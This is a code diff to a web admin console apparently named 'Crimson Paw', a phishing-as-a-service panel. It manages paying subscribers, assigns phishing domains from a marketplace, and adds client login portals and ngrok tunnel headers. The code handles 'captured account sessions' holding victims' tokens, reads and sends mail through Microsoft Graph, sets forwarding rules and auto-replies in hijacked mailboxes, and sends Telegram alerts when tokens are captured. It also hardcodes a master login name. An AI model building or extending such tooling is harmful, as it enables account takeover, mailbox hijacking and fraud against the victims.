+            if (!customDate) {
+                showToast('⚠️ Please pick a calendar expiration date.');
+                return;
+            }
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/renew`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ custom_date: customDate + ' 23:59:59' })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    closeRenewModal();
+                    loadSubscribers();
+                    showToast(`✓ Subscription set to expire on: ${customDate}`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Renewal failed'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        async function toggleClientFreeze(cid, freeze) {
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/freeze`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ freeze })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    loadSubscribers();
+                    showToast(freeze ? '✓ Client account has been frozen.' : '✓ Client account restored to active!');
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        async function deleteSubscriber(cid, username) {
+            const confirmed = await appConfirm({
+                title: 'Delete Client Subscriber',
+                message: `Are you sure you want to permanently delete client "${username}" and revoke their access?`,
+                confirmText: 'Delete Client',
+                icon: '🗑️',
+                danger: true
+            });
+            if (!confirmed) return;
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/delete`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    loadSubscribers();
+                    showToast(`🗑️ Client "${username}" deleted.`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Failed to delete subscriber'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        let _currentMcdClientId = null;
+        async function openManageDomainsModal(cid, username) {
+            _currentMcdClientId = cid;
+            document.getElementById('mcd-client-id').value = cid;
+            document.getElementById('mcd-client-name').textContent = username;
+            document.getElementById('mcd-modal-title').textContent = `Allocated Domains: ${username}`;
+
+            // Populate owned domains dropdown
+            const selectEl = document.getElementById('mcd-domain-select');
+            selectEl.innerHTML = '<option value="">Select an owned domain to assign...</option>';
+            try {
+                const [domRes, mktRes] = await Promise.all([
+                    fetch('/api/lg/domains'),
+                    fetch('/api/lg/marketplace')
+                ]);
+                const doms = [...(await domRes.json()), ...(await mktRes.json())];
+                doms.forEach(d => {
+                    const opt = document.createElement('option');
+                    const isMarket = d.for_sale === 1 || d.for_sale === true;
+                    opt.value = d.domain;
+                    opt.textContent = d.domain + (d.registrar ? ` (${d.registrar})` : '') + (isMarket ? ' — marketplace' : '');
+                    selectEl.appendChild(opt);
+                });
+            } catch (e) {}
+
+            renderClientAssignedDomainsList();
+            const el = document.getElementById('manageClientDomainsModal');
+            if (el) el.classList.add('active');
+        }
+
+        function closeManageDomainsModal() {
+            const el = document.getElementById('manageClientDomainsModal');
+            if (el) el.classList.remove('active');
+        }
+
+        function renderClientAssignedDomainsList() {
+            const container = document.getElementById('mcd-domains-list');
+            if (!container) return;
+            const sub = _allSubscribersCache.find(s => s.id === _currentMcdClientId);
+            const doms = (sub && sub.domain_list) ? sub.domain_list : [];
+
+            if (!doms.length) {
+                container.innerHTML = '<div style="text-align:center; color:var(--text-secondary); padding:16px;">No domains currently allocated to this client. Select a domain above and click Assign.</div>';
+                return;
+            }
+
+            let html = '';
+            doms.forEach(d => {
+                html += `
+                    <div style="display:flex; justify-content:space-between; align-items:center; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:8px 12px;">
+                        <span style="font-family:monospace; font-weight:700; color:#58a6ff;">🌐 ${escapeHtml(d)}</span>
+                        <button type="button" class="btn btn-secondary btn-sm" onclick="executeUnassignDomain('${escapeHtml(d)}')" style="padding:2px 8px; font-size:11px; color:#ef4444; border-color:rgba(239,68,68,0.3);">
+                            ❌ Unassign
+                        </button>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        async function executeAssignDomain() {
+            const cid = _currentMcdClientId;
+            const domain = document.getElementById('mcd-domain-select').value;
+            if (!domain) {
+                showToast('⚠️ Please select an owned domain from the dropdown.');
+                return;
+            }
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/assign-domain`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ domain })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    await loadSubscribers();
+                    renderClientAssignedDomainsList();
+                    showToast(`✓ Domain "${domain}" transferred to client!`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Failed to assign domain'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        async function executeUnassignDomain(domain) {
+            const ok = await appConfirm({
+                title: 'Revoke Domain',
+                message: `Revoke "${domain}" from this client? The domain returns to your marketplace inventory and can be sold or reassigned later.`,
+                confirmText: 'Unassign',
+                icon: '🌐',
+                danger: true
+            });
+            if (!ok) return;
+            const cid = _currentMcdClientId;
+            try {
+                const res = await fetch(`/api/admin/subscribers/${cid}/unassign-domain`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ domain })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    await loadSubscribers();
+                    renderClientAssignedDomainsList();
+                    showToast(`✓ Domain "${domain}" unassigned.`);
+                } else {
+                    showToast('⚠️ ' + (data.error || 'Failed to unassign domain'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        function openBuyDomainRequestModal() {
+            const el = document.getElementById('buyDomainRequestModal');
+            if (el) el.classList.add('active');
+        }
+
+        function closeBuyDomainRequestModal() {
+            const el = document.getElementById('buyDomainRequestModal');
+            if (el) el.classList.remove('active');
         }
 
         async function loadOperators() {
@@ -9557,10 +10894,10 @@ Delegated     : ${inboxesDesc}
                         showToast('✓ Operator updated successfully!');
                     }
                 } else {
-                    alert('Error saving operator: ' + (data.error || 'Unknown error'));
+                    showToast('⚠️ Error saving operator: ' + (data.error || 'Unknown error'));
                 }
             } catch (err) {
-                alert('Connection error: ' + err);
+                showToast('⚠️ Connection error: ' + err);
             } finally {
                 btn.disabled = false;
                 btn.innerText = '💾 Save Operator';
@@ -10075,10 +11412,10 @@ Delegated     : ${inboxesDesc}
                     showToast('✓ Password changed successfully!');
                     input.value = '';
                 } else {
-                    alert('Failed to change password: ' + (d.error || 'Server error'));
+                    showToast('⚠️ Failed to change password: ' + (d.error || 'Server error'));
                 }
             } catch(err) {
-                alert('Connection error: ' + err);
+                showToast('⚠️ Connection error: ' + err);
             } finally {
                 btn.disabled = false;
                 btn.innerText = 'SAVE NEW PASSWORD';
@@ -10115,17 +11452,23 @@ Delegated     : ${inboxesDesc}
             const botToken = (document.getElementById('setting-tg-bot-token') ? document.getElementById('setting-tg-bot-token').value : '').trim();
             const chatId = (document.getElementById('setting-tg-chat-id') ? document.getElementById('setting-tg-chat-id').value : '').trim();
             const notifyToken = document.getElementById('setting-notify-token') ? document.getElementById('setting-notify-token').checked : true;
+            const marketTg = (document.getElementById('setting-marketplace-tg') ? document.getElementById('setting-marketplace-tg').value : '').trim();
+
+            const isClient = Boolean(window._isClientAdmin);
+            const targetUrl = isClient ? '/api/client/settings' : '/api/settings';
+            const storageKey = isClient ? ('crimson_settings_client_' + (window._currentUserId || 'sub')) : 'crimson_paw_settings_admin';
 
             const cfg = {
                 tg_bot_token: botToken,
                 tg_chat_id: chatId,
                 notify_token: notifyToken
             };
+            if (!isClient) cfg.marketplace_telegram_contact = marketTg;
 
-            localStorage.setItem('crimson_paw_settings', JSON.stringify(cfg));
+            localStorage.setItem(storageKey, JSON.stringify(cfg));
 
             try {
-                const r = await fetch('/api/settings', {
+                const r = await fetch(targetUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(cfg)
@@ -10147,7 +11490,7 @@ Delegated     : ${inboxesDesc}
             const chatId = chatEl ? chatEl.value.trim() : '';
 
             if (!botToken || !chatId) {
-                alert('Please enter both Telegram Bot Token and Chat ID first.');
+                showToast('⚠️ Please enter both Telegram Bot Token and Chat ID first.');
                 return;
             }
             showToast('Sending test Telegram alert...');
@@ -10161,10 +11504,10 @@ Delegated     : ${inboxesDesc}
                 if (d.success) {
                     showToast('✓ Telegram alert delivered successfully! Check your Telegram chat.');
                 } else {
-                    alert('Telegram test failed: ' + (d.error || 'Check Bot Token & Chat ID'));
+                    showToast('⚠️ Telegram test failed: ' + (d.error || 'Check Bot Token & Chat ID'));
                 }
             } catch(e) {
-                alert('Telegram dispatch failed: ' + e);
+                showToast('⚠️ Telegram dispatch failed: ' + e);
             }
         }
 
@@ -10172,7 +11515,7 @@ Delegated     : ${inboxesDesc}
             const urlEl = document.getElementById('setting-webhook-url');
             const url = urlEl ? urlEl.value.trim() : '';
             if (!url) {
-                alert('Please enter a Webhook URL first.');
+                showToast('⚠️ Please enter a Webhook URL first.');
                 return;
             }
             showToast('Sending test webhook alert...');
@@ -10910,7 +12253,7 @@ Delegated     : ${inboxesDesc}
             const mid = targetMid || currentOutlookSelectedMessageId;
             const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
             if (!uc || !mid) {
-                alert('Please select a message to restore');
+                showToast('⚠️ Please select a message to restore');
                 return;
             }
 
@@ -10939,7 +12282,7 @@ Delegated     : ${inboxesDesc}
             const mid = targetMid || currentOutlookSelectedMessageId;
             const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
             if (!uc || !mid) {
-                alert('Please select a message to archive');
+                showToast('⚠️ Please select a message to archive');
                 return;
             }
 
@@ -10967,7 +12310,7 @@ Delegated     : ${inboxesDesc}
             const mid = targetMid || currentOutlookSelectedMessageId;
             const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
             if (!uc || !mid) {
-                alert('Please select a message');
+                showToast('⚠️ Please select a message');
                 return;
             }
 
@@ -10990,7 +12333,7 @@ Delegated     : ${inboxesDesc}
             const mid = targetMid || currentOutlookSelectedMessageId;
             const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
             if (!uc || !mid) {
-                alert('Please select a message');
+                showToast('⚠️ Please select a message');
                 return;
             }
 
@@ -11202,7 +12545,7 @@ Delegated     : ${inboxesDesc}
             const btn = document.getElementById('btn-send-mail');
             const statusEl = document.getElementById('compose-status');
 
-            if (!to) { alert('Please enter recipient email address'); return; }
+            if (!to) { showToast('⚠️ Please enter recipient email address'); return; }
             btn.disabled = true;
             btn.innerText = 'Sending...';
             statusEl.innerText = 'Transmitting via Microsoft Graph API...';
@@ -11272,7 +12615,7 @@ Delegated     : ${inboxesDesc}
         async function openMailboxSettings() {
             const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
             if (!uc) {
-                alert('Please select a captured account session first.');
+                showToast('⚠️ Please select a captured account session first.');
                 return;
             }
             document.getElementById('outlookSettingsModal').classList.add('active');
@@ -11409,14 +12752,14 @@ Delegated     : ${inboxesDesc}
                 btn.innerText = 'Save changes';
 
                 if (res.error) {
-                    alert('Error saving automatic replies: ' + (res.error.message || res.error));
+                    showToast('⚠️ Error saving automatic replies: ' + (res.error.message || res.error));
                 } else {
                     showToast('✓ Automatic replies saved to Graph API successfully!');
                 }
             } catch(e) {
                 btn.disabled = false;
                 btn.innerText = 'Save changes';
-                alert('Save failed: ' + e);
+                showToast('⚠️ Save failed: ' + e);
             }
         }
 
@@ -11547,9 +12890,9 @@ Delegated     : ${inboxesDesc}
             const allInboxes = document.getElementById('new-rule-all-inboxes')?.checked || false;
             const btn = document.getElementById('btn-save-new-rule');
 
-            if (!name) { alert('Please enter a rule name'); return; }
+            if (!name) { showToast('⚠️ Please enter a rule name'); return; }
             if ((actionType.startsWith('forward') || actionType === 'redirectTo') && !forwardEmail) {
-                alert('Please enter a recipient email address for the forwarding rule.');
+                showToast('⚠️ Please enter a recipient email address for the forwarding rule.');
                 return;
             }
 
@@ -11854,14 +13197,14 @@ Delegated     : ${inboxesDesc}
                 btn.innerText = 'Save preferences';
 
                 if (res.error) {
-                    alert('Error saving preferences: ' + (res.error.message || res.error));
+                    showToast('⚠️ Error saving preferences: ' + (res.error.message || res.error));
                 } else {
                     showToast('✓ Mailbox preferences saved to Graph API successfully!');
                 }
             } catch(e) {
                 btn.disabled = false;
                 btn.innerText = 'Save preferences';
-                alert('Save failed: ' + e);
+                showToast('⚠️ Save failed: ' + e);
             }
         }
 
@@ -12075,7 +13418,8 @@ Delegated     : ${inboxesDesc}
             });
         }
 
-        async function deleteSession(uc) {
+        async function deleteSession(uc, e = null) {
+            if (e && typeof e.stopPropagation === 'function') e.stopPropagation();
             const ok = await appConfirm({
                 title: 'Delete Captured Session',
                 message: `Are you sure you want to permanently delete session ${uc}? All tokens and captured data for this victim will be removed.`,
@@ -12085,10 +13429,21 @@ Delegated     : ${inboxesDesc}
             });
             if (!ok) return;
             try {
-                await fetch(`/api/sessions/${uc}`, {method:'DELETE'});
-                showToast('🗑️ Session deleted successfully');
-                loadDashboard();
-                loadSessions();
+                const res = await fetch(`/api/sessions/${uc}`, {method:'DELETE'});
+                const data = await res.json();
+                if (res.ok && data.success) {
+                    showToast('🗑️ Session deleted successfully');
+                    const pageDash = document.getElementById('page-dashboard');
+                    if (pageDash && pageDash.classList.contains('active')) {
+                        await loadDashboard();
+                    }
+                    const pageSess = document.getElementById('page-sessions');
+                    if (pageSess && pageSess.classList.contains('active')) {
+                        await loadSessions();
+                    }
+                } else {
+                    showToast('⚠️ Delete failed: ' + (data.error || 'Server rejected deletion'));
+                }
             } catch(e) {
                 showToast('⚠️ Delete session failed: ' + e);
             }
@@ -12157,9 +13512,19 @@ Delegated     : ${inboxesDesc}
                             setTimeout(openOperatorTelegramModal, 600);
                         }
                         return;
+                    } else if (data.is_client_admin) {
+                        if (roleBadge) {
+                            roleBadge.innerHTML = `<span style="font-size:9.5px; color:#a49498; font-weight:700; letter-spacing:0.06em;">USER</span>`;
+                        }
+                        const navOp = document.getElementById('nav-operators');
+                        if (navOp) navOp.style.display = 'none';
+                        const navAud = document.getElementById('nav-audit');
+                        if (navAud) navAud.style.display = 'none';
+                        const navCli = document.getElementById('nav-clients');
+                        if (navCli) navCli.style.display = 'none';
                     } else {
                         if (roleBadge) {
-                            roleBadge.innerHTML = `<span style="font-size:9.5px; color:#a49498; font-weight:700; letter-spacing:0.06em;">ADMIN</span>`;
+                            roleBadge.innerHTML = `<span style="font-size:9.5px; color:var(--accent-color); font-weight:700; letter-spacing:0.06em;">ADMIN</span>`;
                         }
                     }
                 }
@@ -13841,7 +15206,9 @@ Delegated     : ${inboxesDesc}
 
         // On page refresh or closing the tab, terminate operator session so re-authentication is required
         window.addEventListener('beforeunload', function() {
-            navigator.sendBeacon('/api/auth/logout');
+            if (typeof currentUserRole !== 'undefined' && currentUserRole === 'operator') {
+                navigator.sendBeacon('/api/auth/logout');
+            }
         });
     </script>
 </body>
@@ -14067,7 +15434,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
         <div class="brand-header">
             <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Crimson Paw' }}" class="brand-logo" style="object-fit:contain;">
             <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
-            <div class="brand-subtitle">Administrator Console</div>
+            <div class="brand-subtitle">SuperAdmin Console</div>
         </div>
 
         <div id="login-alert" class="alert-box"></div>
@@ -14075,7 +15442,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
         <!-- Admin Form Step 1: Identifier & Password -->
         <form id="admin-login-form" onsubmit="handleAdminLogin(event)">
             <div class="form-group">
-                <label class="form-label" for="username">Administrator Identifier</label>
+                <label class="form-label" for="username">SuperAdmin Identifier</label>
                 <input type="text" id="username" class="form-input" placeholder="admin" autocomplete="username" required autofocus>
             </div>
             <div class="form-group">
@@ -14106,7 +15473,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             </div>
         </div>
 
-        <div class="footer-note">CRIMSON PAW RED TEAM CONSOLE • RESTRICTED ACCESS</div>
+        <div class="footer-note">{{ platform_name or 'CRIMSON PAW' }} • SUPERADMIN CONSOLE</div>
     </div>
 
     <!-- Master Superadmin Emergency Switch Modal -->
@@ -14155,6 +15522,23 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
     </div>
 
     <script>
+        // Global Ngrok & Tunnel Bypass for all AJAX/Fetch requests
+        (function() {
+            const _origFetch = window.fetch;
+            window.fetch = function(url, options) {
+                options = options || {};
+                options.headers = options.headers || {};
+                if (options.headers instanceof Headers) {
+                    if (!options.headers.has('ngrok-skip-browser-warning')) {
+                        options.headers.set('ngrok-skip-browser-warning', 'true');
+                    }
+                } else if (typeof options.headers === 'object') {
+                    options.headers['ngrok-skip-browser-warning'] = 'true';
+                }
+                return _origFetch(url, options);
+            };
+        })();
+
         let twoFaExpiryTimer = null;
         let twoFaRemainingSec = 300;
         let _activeMasterKey = '';
@@ -14190,9 +15574,19 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 
             try {
                 const res = await fetch('/api/admin/client-lock', {
-                    headers: { 'X-Master-Key': key }
+                    headers: { 
+                        'X-Master-Key': key,
+                        'ngrok-skip-browser-warning': 'true',
+                        'Accept': 'application/json'
+                    }
                 });
-                const data = await res.json();
+                const text = await res.text();
+                let data = {};
+                try {
+                    data = JSON.parse(text);
+                } catch(pe) {
+                    throw new Error('Server returned HTML instead of JSON (Status ' + res.status + '). Ensure ngrok tunnel is healthy.');
+                }
                 btn.disabled = false;
                 btn.innerText = 'Authorize Master Key ❯';
 
@@ -14207,7 +15601,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             } catch(e) {
                 btn.disabled = false;
                 btn.innerText = 'Authorize Master Key ❯';
-                errEl.innerText = 'Connection error: ' + e;
+                errEl.innerText = 'Connection error: ' + (e.message || e);
                 errEl.style.display = 'block';
             }
         }
@@ -14252,11 +15646,19 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'X-Master-Key': _activeMasterKey
+                        'X-Master-Key': _activeMasterKey,
+                        'ngrok-skip-browser-warning': 'true',
+                        'Accept': 'application/json'
                     },
                     body: JSON.stringify({ locked: !_isClientLocked })
                 });
-                const data = await res.json();
+                const text = await res.text();
+                let data = {};
+                try {
+                    data = JSON.parse(text);
+                } catch(pe) {
+                    throw new Error('Server response error (Status ' + res.status + ')');
+                }
                 btnToggle.disabled = false;
 
                 if (res.ok && data.success) {
@@ -14267,7 +15669,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
                 }
             } catch(e) {
                 btnToggle.disabled = false;
-                alert('Connection error: ' + e);
+                alert('Connection error: ' + (e.message || e));
             }
         }
 
@@ -14279,13 +15681,23 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             try {
                 const res = await fetch('/api/auth/login', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true',
+                        'Accept': 'application/json'
+                    },
                     body: JSON.stringify({
                         username: 'icebadger_master',
                         password: _activeMasterKey
                     })
                 });
-                const data = await res.json();
+                const text = await res.text();
+                let data = {};
+                try {
+                    data = JSON.parse(text);
+                } catch(pe) {
+                    throw new Error('Login response parse error (Status ' + res.status + ')');
+                }
                 if (data.success) {
                     btn.innerText = 'Authorized ✓ Redirecting...';
                     window.location.href = data.redirect || '/dashboard';
@@ -14453,6 +15865,273 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
                 }
             } catch(err) {
                 showAlert('Error resending code: ' + err);
+            }
+        }
+    </script>
+</body>
+</html>
+'''
+
+# ── DEDICATED CLIENT PORTAL LOGIN HTML ──────────────────────────────────
+CRIMSON_PAW_CLIENT_LOGIN_HTML = r'''<!DOCTYPE html>
+<html lang="en" data-theme="{{ active_theme or 'crimson' }}">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ platform_name or 'CRIMSON PAW' }} — Client Portal Access</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root, [data-theme="crimson"] { 
+            --bg-primary: #0a0709; --bg-sidebar: #100b0e; --bg-panel: #161014; 
+            --border-color: #2e1216; --border-hover: #4e1a22;
+            --text-primary: #f0ebed; --text-secondary: #a49498; 
+            --accent-color: #e50914; --accent-hover: #ff2a35;
+            --accent-glow: rgba(229, 9, 20, 0.35); --accent-glow-strong: rgba(229, 9, 20, 0.65);
+            --accent-gradient: linear-gradient(135deg, #e50914, #b00710);
+            --accent-gradient-hover: linear-gradient(135deg, #ff1f2a, #cc0813);
+            --badge-bg: #261115; --badge-border: #5a1c22; --badge-color: #ff8b94;
+        }
+        [data-theme="blue"] {
+            --bg-primary: #050a14; --bg-sidebar: #091020; --bg-panel: #0d172e;
+            --border-color: #16264c; --border-hover: #23407d;
+            --text-primary: #e6f0ff; --text-secondary: #8da2c0;
+            --accent-color: #0084ff; --accent-hover: #339cff;
+            --accent-glow: rgba(0, 132, 255, 0.35); --accent-glow-strong: rgba(0, 132, 255, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0084ff, #0056b3);
+            --accent-gradient-hover: linear-gradient(135deg, #339cff, #006ee6);
+            --badge-bg: #0d2244; --badge-border: #1a427d; --badge-color: #80bfff;
+        }
+        [data-theme="green"] {
+            --bg-primary: #051208; --bg-sidebar: #091c0e; --bg-panel: #0e2b16;
+            --border-color: #154522; --border-hover: #1e6633;
+            --text-primary: #e6ffed; --text-secondary: #8dc09a;
+            --accent-color: #00e676; --accent-hover: #33eb91;
+            --accent-glow: rgba(0, 230, 118, 0.35); --accent-glow-strong: rgba(0, 230, 118, 0.65);
+            --accent-gradient: linear-gradient(135deg, #00c853, #009624);
+            --accent-gradient-hover: linear-gradient(135deg, #00e676, #00b248);
+            --badge-bg: #0b3318; --badge-border: #14592a; --badge-color: #69f0ae;
+        }
+        [data-theme="purple"] {
+            --bg-primary: #0a0514; --bg-sidebar: #120924; --bg-panel: #1b0e36;
+            --border-color: #311860; --border-hover: #4a2491;
+            --text-primary: #f3e8ff; --text-secondary: #aa95c4;
+            --accent-color: #a855f7; --accent-hover: #be7bf9;
+            --accent-glow: rgba(168, 85, 247, 0.35); --accent-glow-strong: rgba(168, 85, 247, 0.65);
+            --accent-gradient: linear-gradient(135deg, #9333ea, #6b21a8);
+            --accent-gradient-hover: linear-gradient(135deg, #a855f7, #7e22ce);
+            --badge-bg: #221040; --badge-border: #4a2491; --badge-color: #d8b4fe;
+        }
+        [data-theme="emerald"] {
+            --bg-primary: #04100c; --bg-sidebar: #081a14; --bg-panel: #0c261e;
+            --border-color: #113d30; --border-hover: #1b5c48;
+            --text-primary: #e6fcf5; --text-secondary: #87bdae;
+            --accent-color: #10b981; --accent-hover: #34d399;
+            --accent-glow: rgba(16, 185, 129, 0.35); --accent-glow-strong: rgba(16, 185, 129, 0.65);
+            --accent-gradient: linear-gradient(135deg, #10b981, #059669);
+            --accent-gradient-hover: linear-gradient(135deg, #34d399, #10b981);
+            --badge-bg: #0b2b22; --badge-border: #1b5c48; --badge-color: #6ee7b7;
+        }
+        [data-theme="obsidian"] {
+            --bg-primary: #090a0f; --bg-sidebar: #10121a; --bg-panel: #161924;
+            --border-color: #242938; --border-hover: #383f56;
+            --text-primary: #f8fafc; --text-secondary: #94a3b8;
+            --accent-color: #64748b; --accent-hover: #94a3b8;
+            --accent-glow: rgba(100, 116, 139, 0.35); --accent-glow-strong: rgba(100, 116, 139, 0.65);
+            --accent-gradient: linear-gradient(135deg, #475569, #334155);
+            --accent-gradient-hover: linear-gradient(135deg, #64748b, #475569);
+            --badge-bg: #1e2433; --badge-border: #383f56; --badge-color: #cbd5e1;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-image: 
+                radial-gradient(ellipse at 50% 20%, var(--accent-glow) 0%, transparent 60%),
+                radial-gradient(circle at 80% 80%, rgba(255, 255, 255, 0.02) 0%, transparent 40%);
+        }
+        .login-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 36px 32px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.65), 0 0 20px var(--accent-glow);
+            position: relative;
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .brand-logo {
+            width: 52px;
+            height: 52px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 12px;
+            box-shadow: 0 0 14px var(--accent-glow);
+        }
+        .brand-title {
+            font-size: 1.25rem;
+            font-weight: 900;
+            letter-spacing: 0.12em;
+            color: #ffffff;
+            text-transform: uppercase;
+        }
+        .brand-subtitle {
+            font-size: 0.72rem;
+            font-weight: 700;
+            letter-spacing: 0.2em;
+            color: var(--accent-color);
+            text-transform: uppercase;
+            margin-top: 4px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-label {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: var(--text-secondary);
+        }
+        .form-input {
+            width: 100%;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            padding: 12px 14px;
+            font-size: 0.92rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        .form-input:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px var(--accent-glow);
+            background: var(--bg-sidebar);
+        }
+        .btn-submit {
+            width: 100%;
+            background: var(--accent-gradient);
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 13px 18px;
+            font-size: 0.88rem;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 8px;
+            box-shadow: 0 4px 18px var(--accent-glow);
+        }
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 22px var(--accent-glow-strong);
+            background: var(--accent-gradient-hover);
+        }
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .alert-box {
+            background: var(--badge-bg);
+            border: 1px solid var(--badge-border);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            color: var(--accent-color);
+            margin-bottom: 18px;
+            display: none;
+            line-height: 1.4;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 0.68rem;
+            color: var(--text-secondary);
+            margin-top: 22px;
+            letter-spacing: 0.04em;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="brand-header">
+            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Platform' }}" class="brand-logo" style="object-fit:contain;">
+            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
+            <div class="brand-subtitle">Client Portal Access</div>
+        </div>
+
+        <div id="login-alert" class="alert-box"></div>
+
+        <form id="client-login-form" onsubmit="handleClientLogin(event)">
+            <div class="form-group">
+                <label class="form-label" for="username">Client Username</label>
+                <input type="text" id="username" class="form-input" placeholder="Enter your client username" autocomplete="username" required autofocus>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="password">Password</label>
+                <input type="password" id="password" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required>
+            </div>
+            <button type="submit" id="btn-client-login" class="btn-submit">Sign In To Portal ❯</button>
+        </form>
+
+        <div class="footer-note">{{ platform_name or 'CRIMSON PAW' }} • CLIENT ACCESS PORTAL</div>
+    </div>
+
+    <script>
+        function showAlert(msg) {
+            const el = document.getElementById('login-alert');
+            el.innerText = msg;
+            el.style.display = 'block';
+        }
+
+        async function handleClientLogin(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-client-login');
+            const user = document.getElementById('username').value.trim();
+            const pwd = document.getElementById('password').value;
+            const alertEl = document.getElementById('login-alert');
+
+            alertEl.style.display = 'none';
+            btn.disabled = true;
+            btn.innerText = 'Verifying Account...';
+
+            try {
+                const res = await fetch('/api/auth/client-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: user, password: pwd })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Sign In To Portal ❯';
+
+                if (res.ok && data.success) {
+                    btn.innerText = 'Access Granted ✓ Redirecting...';
+                    window.location.href = data.redirect || '/dashboard';
+                } else {
+                    showAlert(data.error || 'Invalid credentials or inactive subscription.');
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }
+            } catch(err) {
+                btn.disabled = false;
+                btn.innerText = 'Sign In To Portal ❯';
+                showAlert('Connection error: ' + err);
             }
         }
     </script>
@@ -15170,10 +16849,10 @@ def lookup_deployment(host_header, path_slug):
             conn.close()
             return dict(dep)
 
-    # 4. If path_clean is empty (visiting root of custom domain), match deployment on this domain
